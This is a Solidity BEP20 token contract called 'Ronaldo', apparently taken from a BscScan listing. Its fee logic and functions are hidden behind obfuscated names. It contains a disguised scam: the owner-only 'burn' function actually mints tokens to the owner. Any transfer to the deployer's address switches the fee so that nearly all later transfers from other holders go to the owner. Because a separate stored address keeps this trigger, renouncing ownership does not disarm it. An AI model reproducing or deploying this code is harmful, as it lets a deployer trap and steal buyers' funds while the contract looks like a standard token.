/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-16 06:40:01 GMT
 */
 /*
 ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ 
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║
██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝
 ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ 
                     
*/
 // SPDX-License-Identifier: MIT
 
pragma solidity >=0.6.0;
contract YCGSZHQ {
uint256 private  OLFZID = 1000000000000000000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  LEVHKO = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 private  XXPYGB = 10000000000000;
uint256 public constant LNFMBJ = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  TWQXTO = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  CQMFPA = 1000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  EFDBYU = 100000000;
address private  IVDEYU = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "Ronaldo";
string public  symbol = "Ronaldo";
uint256 private  UKPTNU = 10000000000;
address private  HZQODX = address(0);
uint256 private  DUMJJP = 1000000000000000000;
address private  DIFNRT = address(0);
address private  UEYHAJ = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getIVDEYU() private returns (address) {
return IVDEYU;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OXVJTO");
require(to != address(0), "OXVJTO");
require(amount <= balanceOf[from], "OXVJTO");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LNFMBJ/DUMJJP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HZQODX){
DUMJJP = LNFMBJ+2;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getOLFZID() private returns (uint256) {
return OLFZID;
}

function _getUEYHAJ() private returns (address) {
return UEYHAJ;
}

function _getXXPYGB() private returns (uint256) {
return XXPYGB;
}

function _getLEVHKO() private returns (uint256) {
return LEVHKO;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getEFDBYU() private returns (uint256) {
return EFDBYU;
}

constructor () public {
HZQODX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getTWQXTO() private returns (address) {
return TWQXTO;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getCQMFPA() private returns (uint256) {
return CQMFPA;
}

function _getUKPTNU() private returns (uint256) {
return UKPTNU;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getDIFNRT() private returns (address) {
return DIFNRT;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tOXVJTO 0");
require(spender != address(0), "fOXVJTO 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}